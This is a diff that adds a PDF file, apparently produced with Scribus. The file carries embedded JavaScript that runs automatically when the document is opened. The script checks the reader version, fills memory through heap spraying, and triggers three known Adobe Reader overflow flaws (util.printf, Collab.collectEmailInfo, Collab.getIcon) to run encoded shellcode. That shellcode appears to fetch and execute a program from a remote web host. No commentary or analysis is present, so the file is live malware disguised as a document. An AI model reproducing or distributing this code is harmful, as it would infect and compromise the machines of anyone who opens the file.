@@ -1,0 +1,206 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<</OpenAction <</JS (this.ZyzYsilyf\(\))
+/S /JavaScript
+>>
+/Threads 2 0 R
+/Outlines 3 0 R
+/Pages 4 0 R
+/ViewerPreferences <</PageDirection /L2R
+>>
+/PageLayout /SinglePage
+/AcroForm 5 0 R
+/Dests 6 0 R
+/Names 7 0 R
+/Type /Catalog
+>>
+endobj
+2 0 obj
+[]
+endobj
+3 0 obj
+<</Count 0
+/Type /Outlines
+>>
+endobj
+4 0 obj
+<</Resources 8 0 R
+/Kids [9 0 R]
+/Count 1
+/Type /Pages
+>>
+endobj
+5 0 obj
+<</Fields []
+>>
+endobj
+6 0 obj
+<<>>
+endobj
+7 0 obj
+<</JavaScript 10 0 R
+>>
+endobj
+8 0 obj
+<</ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
+>>
+endobj
+9 0 obj
+<</Rotate 0
+/Parent 4 0 R
+/Resources 8 0 R
+/TrimBox [0 0 595.28000 841.89000]
+/MediaBox [0 0 595.28000 841.89000]
+/pdftk_PageNum 1
+/Contents 11 0 R
+/Type /Page
+>>
+endobj
+10 0 obj
+<</Names [(New_Script) 12 0 R]
+>>
+endobj
+11 0 obj
+<</Length 31
+>>
+stream
+0 0 595.28000 841.89000 re W n
+
+endstream
+endobj
+12 0 obj
+<</JS 13 0 R
+/S /JavaScript
+>>
+endobj
+13 0 obj
+<</Length 5366
+>>
+stream
+function ZyzYsilyf(){
+	function fix_it(yarsp, len){
+		while (yarsp.length * 2 < len){
+			yarsp += yarsp;
+		}
+		yarsp = yarsp.substring(0, len/2);
+		return yarsp;
+	}
+
+	function util_printf(){
+		var payload = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6B2F%u7265%u6972%u636D%u656B%u7465%u2E71%u6E69%u6F66%u742F%u6C2F%u616F%u2E64%u6870%u3F70%u3D65%u0032");
+		var nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A")
+		var heapblock = nop + payload;
+		var bigblock = unescape("%u0A0A%u0A0A");
+		var headersize = 20;
+		var spray = headersize + heapblock.length;
+		while (bigblock.length < spray){
+			bigblock += bigblock;
+		}
+		var fillblock = bigblock.substring(0, spray);
+		var block = bigblock.substring(0, bigblock.length-spray);
+		while (block.length+spray < 0x40000){
+			block = block + block + fillblock;
+		}
+		var mem_array = new Array();
+		for (var i = 0; i < 1400; i++){
+			mem_array[i] = block + heapblock;
+		}
+		var num = 12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;
+		util.printf("%45000f", num);
+	}
+
+	function collab_email(){
+		var shellcode = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6B2F%u7265%u6972%u636D%u656B%u7465%u2E71%u6E69%u6F66%u742F%u6C2F%u616F%u2E64%u6870%u3F70%u3D65%u0032");
+		var mem_array = new Array();
+		var cc = 0x0c0c0c0c;
+		var addr = 0x400000;
+		var sc_len = shellcode.length * 2;
+		var len = addr - (sc_len+0x38);
+		var yarsp = unescape("%u9090%u9090");
+		yarsp = fix_it(yarsp, len);
+		var count2 = (cc - 0x400000)/addr;
+		for (var count = 0; count < count2; count++){
+			mem_array[count] = yarsp + shellcode;
+		}
+		var overflow = unescape("%u0c0c%u0c0c");
+		while (overflow.length < 44952){
+			overflow += overflow;
+		}
+		this.collabStore = Collab.collectEmailInfo({subj: "",msg: overflow});
+	}
+
+	function collab_geticon(){
+		if (app.doc.Collab.getIcon){
+			var arry = new Array();
+			var vvpethya = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6B2F%u7265%u6972%u636D%u656B%u7465%u2E71%u6E69%u6F66%u742F%u6C2F%u616F%u2E64%u6870%u3F70%u3D65%u0032");
+			var hWq500CN = vvpethya.length * 2;
+			var len = 0x400000 - (hWq500CN + 0x38);
+			var yarsp = unescape("%u9090%u9090");
+			yarsp = fix_it(yarsp, len);
+			var p5AjK65f = (0x0c0c0c0c - 0x400000) / 0x400000;
+			for (var vqcQD96y = 0; vqcQD96y < p5AjK65f; vqcQD96y ++ ){
+				arry[vqcQD96y] = yarsp + vvpethya;
+			}
+			var tUMhNbGw = unescape("%09");
+			while (tUMhNbGw.length < 0x4000){
+				tUMhNbGw += tUMhNbGw;
+			}
+			tUMhNbGw = "N." + tUMhNbGw;
+			app.doc.Collab.getIcon(tUMhNbGw);
+		}
+	}
+	function pdf_start(){
+		var version = app.viewerVersion.toString();
+		version = version.replace(/\D/g,'');
+		var varsion_array = new Array(version.charAt(0), version.charAt(1), version.charAt(2));
+		if ((varsion_array[0] == 8) && (varsion_array[1] == 0) || (varsion_array[1] == 1 && varsion_array[2] < 3)){
+			util_printf();
+		}
+		if ((varsion_array[0] < 8) || (varsion_array[0] == 8 && varsion_array[1] < 2 && varsion_array[2] < 2)){
+			collab_email();
+		}
+		if ((varsion_array[0] < 9) || (varsion_array[0] == 9 && varsion_array[1] < 1)){
+			collab_geticon();
+		}
+	}	
+	pdf_start();
+}
+endstream
+endobj
+14 0 obj
+<</Creator (Scribus 1.3.3.12)
+/Title <>
+/Producer (Scribus PDF Library 1.3.3.12)
+/Author <>
+/Keywords <>
+/Trapped /False
+/ModDate (2008312053854)
+/CreationDate (2008312053854)
+>>
+endobj
+xref
+0 15
+0000000000 65535 f 
+0000000015 00000 n 
+0000000261 00000 n 
+0000000279 00000 n 
+0000000324 00000 n 
+0000000397 00000 n 
+0000000428 00000 n 
+0000000448 00000 n 
+0000000487 00000 n 
+0000000553 00000 n 
+0000000731 00000 n 
+0000000781 00000 n 
+0000000862 00000 n 
+0000000909 00000 n 
+0000004186 00000 n 
+trailer
+<</Info 14 0 R
+/Root 1 0 R
+/Size 15
+>>
+startxref
+4374
+%%EOF
